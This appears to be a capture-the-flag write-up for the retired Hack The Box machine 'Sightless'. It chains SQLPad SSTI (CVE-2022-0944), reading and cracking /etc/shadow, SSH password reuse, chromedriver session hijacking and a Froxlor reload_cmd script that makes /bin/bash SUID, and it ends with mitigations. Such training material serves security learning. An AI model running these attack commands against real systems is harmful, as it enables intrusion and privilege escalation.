---
machine: Sightless
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, sqlpad, cve-2022-0944, ssti, chromedriver, froxlor]
---

# Sightless — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

SQLPad 6.10.0 is vulnerable to CVE-2022-0944, a Nunjucks SSTI in `/api/test-connection`. Execution inside the container leaks `/etc/shadow`; `michael`'s password is reused over SSH. A local `chromedriver` allows hijacking the Froxlor session and abusing `reload_cmd` for root.

## Reconnaissance

```bash
nmap -Pn -sC -sV -p21,22,80 <IP>
```

- ProFTPD, OpenSSH and nginx.
- `sightless.htb` is a static landing page.
- Vhost enumeration discovers `sqlpad.sightless.htb` and `admin.sightless.htb`.

## Enumeration

- SQLPad shows version 6.10.0.
- `/api/test-connection` accepts JSON without authentication.
- The `trino` driver passes `data.host` to the Nunjucks template engine.

## Foothold

A Nunjucks expression calls `child_process.exec`. The request errors or hangs, but the reverse shell arrives as root inside the container.

```bash
curl -s -X POST http://sqlpad.sightless.htb/api/test-connection \
  -H 'Content-Type: application/json' --data @ssti.json
```

The container exposes `/etc/shadow`; `michael`'s SHA-512 hash is cracked with `hashcat -m 1800`. The same password works over SSH on the host.

```bash
cat /etc/shadow
hashcat -m 1800 michael.hash /usr/share/wordlists/rockyou.txt
ssh michael@sightless.htb
```

## Privilege escalation

`ps aux` reveals a `chromedriver --port=<PORT>` controlling an authenticated Froxlor session. The port is forwarded and WebDriver executes JavaScript in the active tab.

```bash
ps aux | grep chromedriver
ssh -L <PORT>:127.0.0.1:<PORT> michael@sightless.htb -N
```

With the administrator session, the PHP-FPM daemon is edited and `reload_cmd` points to a custom script. Froxlor's cron runs it as root.

```bash
printf '#!/bin/bash\nchmod 4755 /bin/bash\n' > /tmp/pwn.sh
chmod +x /tmp/pwn.sh
# In Froxlor: reload_cmd = /tmp/pwn.sh
/bin/bash -p
```

## Evidence

- SSTI request and `id` output in the container.
- `michael`'s hash and SSH access, with the password redacted.
- `chromedriver` process and SSH tunnel.
- `reload_cmd` and SUID binary.
- Redacted flag.

## Lessons learned

- SSTI in an apparently connection-only field can execute commands.
- A container's `/etc/shadow` may hold credentials reused on the host.
- A headless browser with an active session is a full administrative surface.

## Mitigations and detection

- Update SQLPad and authenticate `/api/test-connection`.
- Isolate credentials between containers and the host.
- Do not expose `chromedriver` without authentication and restrict local access.
- Validate `reload_cmd` and run panel services with least privilege.

## References

- <https://www.hackthebox.com/machines/Sightless>
- <https://github.com/advisories/GHSA-p7gv-hw3c-jxj4>
- <https://nvd.nist.gov/vuln/detail/CVE-2022-0944>
- <https://attack.mitre.org/techniques/T1190/>
